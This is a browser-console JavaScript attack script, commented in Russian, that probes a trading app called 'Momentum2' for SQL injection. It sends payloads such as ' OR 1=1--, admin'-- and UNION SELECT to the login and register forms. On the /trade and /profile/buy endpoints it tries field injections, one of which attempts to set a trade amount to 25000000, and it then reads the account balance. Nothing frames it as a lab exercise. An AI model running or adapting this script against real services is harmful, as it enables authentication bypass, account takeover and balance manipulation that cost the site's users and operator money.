/* Momentum2 — ищем SQLi там, где приложение работает с базой АККАУНТОВ.
 *
 * /promo/check видит только /tmp/promos.db. Аккаунты — другой файл, другой эндпоинт.
 * Проверяем: /login, /register, /trade, /profile/buy.
 * Признак инъекции: разный текст ошибки / разное поведение на ' и на '' .
 */
(async () => {
  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const post = async (path, data, json = true) => {
    try {
      const r = await fetch(path, {
        method: 'POST', credentials: 'include',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', accept: '*/*' },
        body: new URLSearchParams(data),
      });
      const t = await r.text();
      let j = null;
      if (json) { try { j = JSON.parse(t.replace(/\\u([0-9a-f]{4})/gi, (_, h) => String.fromCharCode(parseInt(h, 16)))); } catch (e) {} }
      return { status: r.status, json: j, text: t.replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').slice(0, 160) };
    } catch (e) { return { status: 0, json: null, text: String(e) }; }
  };
  const show = (label, r) => {
    const body = r.json ? JSON.stringify(r.json).slice(0, 130) : r.text;
    console.log('%c' + label.padEnd(34) + '%c' + r.status + '  ' + body,
      'color:#0a0;font-weight:bold', 'color:inherit');
  };

  const U = 'zz' + Math.random().toString(36).slice(2, 8);
  const P = 'Pa55word!x';

  console.log('%c=== 1. базовая линия (/login) ===', 'color:#e90;font-weight:bold');
  show('пустые поля', await post('/login', { username: '', password: '' }));
  show('несуществующий', await post('/login', { username: 'nosuchuser' + Date.now(), password: 'x' }));
  show('валидный (регистрируем)', await post('/register', { username: U, password: P }));
  show('  затем вход', await post('/login', { username: U, password: P }));
  show('неверный пароль', await post('/login', { username: U, password: 'wrong' }));

  console.log('%c=== 2. инъекции в username ===', 'color:#e90;font-weight:bold');
  const loginPayloads = [
    "' OR 1=1--",
    "' OR 1=1-- -",
    "' OR '1'='1",
    "admin'--",
    "' OR username IS NOT NULL--",
    "x' UNION SELECT 1,2,3--",
  ];
  for (const p of loginPayloads) {
    show(JSON.stringify(p), await post('/login', { username: p, password: 'x' }));
    await sleep(120);
  }

  console.log('%c=== 3. инъекции в register ===', 'color:#e90;font-weight:bold');
  for (const p of ["' OR 1=1--", "x','y')--", "'||(SELECT 1)||'"]) {
    show(JSON.stringify(p), await post('/register', { username: p, password: P }));
    await sleep(120);
  }

  console.log('%c=== 4. /trade: куда можно влезть ===', 'color:#e90;font-weight:bold');
  const base = { asset: 'RUB/USD', direction: 'up', amount: '1', multiplier: '1.01' };
  show('нормальная сделка', await post('/trade', base));
  const inj = {
    asset: ["RUB/USD'--", "' OR 1=1--", "RUB/USD' OR '1'='1"],
    direction: ["up'--", "' OR 1=1--", "up' , amount=25000000--"],
    multiplier: ["1.01'--", "1.01 OR 1=1--", "1.011--"],
  };
  for (const field of Object.keys(inj)) {
    for (const v of inj[field]) {
      const d = { ...base, [field]: v };
      show(`${field}=${JSON.stringify(v)}`, await post('/trade', d));
      await sleep(120);
    }
  }

  console.log('%c=== 5. /profile/buy с параметрами ===', 'color:#e90;font-weight:bold');
  for (const d of [{}, { price: '0' }, { amount: '0' }, { id: "' OR 1=1--" }]) {
    show(JSON.stringify(d), await post('/profile/buy', d));
    await sleep(120);
  }

  console.log('%c=== 6. текущий баланс ===', 'color:#e90;font-weight:bold');
  const prof = await (await fetch('/profile', { credentials: 'include' })).text();
  show('баланс', { status: 200, json: null, text: (prof.match(/([\d][\d\s\u00a0]{0,14})\s*(?:₽|руб)/) || ['?'])[0] });

  console.log('%cГотово. Ищи в выводе: разные ответы на \' и на обычную строку — это оракул.',
              'color:#0a0;font-weight:bold');
})();
